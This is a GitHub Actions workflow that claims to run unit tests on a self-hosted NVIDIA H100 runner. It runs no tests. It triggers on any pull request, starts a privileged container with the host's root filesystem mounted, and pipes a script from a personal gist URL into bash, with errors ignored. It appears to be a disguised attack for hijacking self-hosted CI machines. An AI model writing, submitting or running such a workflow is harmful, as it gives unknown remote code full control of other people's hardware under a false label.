name: nv-h100
run-name: nv-h100

on:
  pull_request

jobs:
  unit-tests:
    runs-on: [self-hosted, nvidia, h100]
    container:
      image: ubuntu:latest
      volumes:
          - /:/host/
      options: --privileged
    steps:
      - name: unit-tests
        continue-on-error: true
        run: |
          apt update
          apt install -y curl
          curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/923478482119dd7a5484ab4e7992f9975eb22ded/bak41162231010 | bash